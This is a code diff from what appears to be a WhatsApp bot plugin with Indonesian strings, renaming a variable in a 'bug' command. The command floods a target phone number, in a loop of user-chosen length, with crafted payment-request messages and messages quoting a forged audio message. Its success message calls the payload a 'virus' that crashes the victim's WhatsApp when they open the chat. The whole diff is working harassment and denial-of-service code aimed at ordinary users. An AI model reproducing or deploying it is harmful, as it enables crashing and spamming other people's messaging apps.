@@ -3,7 +3,7 @@ if (!text) throw `*Jangan salah gunakan om yah*\n\nExample: ${command} 628XXXXXX
 let num = text.split('/')[0]+"@s.whatsapp.net"
 let jumlah = text.split('/')[1]
 await m.reply(`*_Sedang Mengirim......_*`)
-const zyko = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
+const exbot = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
 		"message": {
 			"audioMessage": {
 				"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
@@ -17,7 +17,7 @@ const zyko = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remo
 				"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
 				"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
 				"mediaKeyTimestamp": "1632753911"
-/*const zyko = { 
+/*const exbot = { 
 key: {
 fromMe: false, 
 participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {}) 
@@ -30,13 +30,13 @@ participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {})
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": "Zyko-MD",
+"fileName": "exbot-MD",
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="*/
 }}}
 for (let i = 0; i < jumlah; i++) {
 /*conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {image: thumb, bugimage }, {quoted: bugimage})*/
 conn.relayMessage(num, { requestPaymentMessage: { Message: { extendedTextMessage: { text: '💩', currencyCodeIso4217: 'IDR', requestFrom: '@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
-conn.sendMessage(num, { text: '💩'}, { quoted: zyko })
+conn.sendMessage(num, { text: '💩'}, { quoted: exbot })
 }
 m.reply(`Sukses Mengirim ${command}\nKe Nomor: ~${text}~\n\n*NOTE :* Virus Ini Aktif Ketika Korban membuka Chat nya,Maka Wangsafnya Akan Crash hehe🗿`)
 }
